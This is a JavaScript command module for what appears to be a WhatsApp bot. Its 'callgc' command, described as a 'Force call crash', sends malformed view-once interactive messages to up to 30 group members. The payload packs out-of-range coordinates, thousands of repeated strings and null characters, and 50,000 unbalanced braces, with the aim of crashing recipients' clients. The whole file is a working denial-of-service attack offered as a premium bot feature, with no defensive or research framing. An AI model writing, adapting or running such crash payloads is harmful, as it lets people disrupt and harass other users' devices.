import { isPremiumUser } from '../../utils/premiumStore.js';
export default {
    name: 'callgc', aliases: ['fcgc', 'forcecall'], category: 'bug',
    description: 'Force call crash on group members', usage: 'callgc', cooldown: 30, ownerOnly: true, groupOnly: true,
    async execute({ sock, message, from, sender, isOwner }) {
        if (!isPremiumUser(sender) && !isOwner) return sock.sendMessage(from, { text: '❌ Premium required.' }, { quoted: message });
        await sock.sendMessage(from, { react: { text: '📞', key: message.key } });
        const meta = await sock.groupMetadata(from).catch(() => null);
        const members = meta?.participants?.slice(0, 30) || [];
        for (const m of members) {
            try { await sock.relayMessage(m.id, { viewOnceMessage: { message: { interactiveMessage: { header: { title: "📞", hasMediaAttachment: false, locationMessage: { degreesLatitude: -9999999999, degreesLongitude: 9999999999, name: "CALL", address: "CALL".repeat(1000) } }, body: { text: "\u0000".repeat(5000) }, nativeFlowMessage: { messageParamsJson: "{".repeat(50000) } } } } } }, {}); } catch {}
        }
        await sock.sendMessage(from, { text: '✅ Call crash sent to ' + members.length + ' members' }, { quoted: message });
    }
};
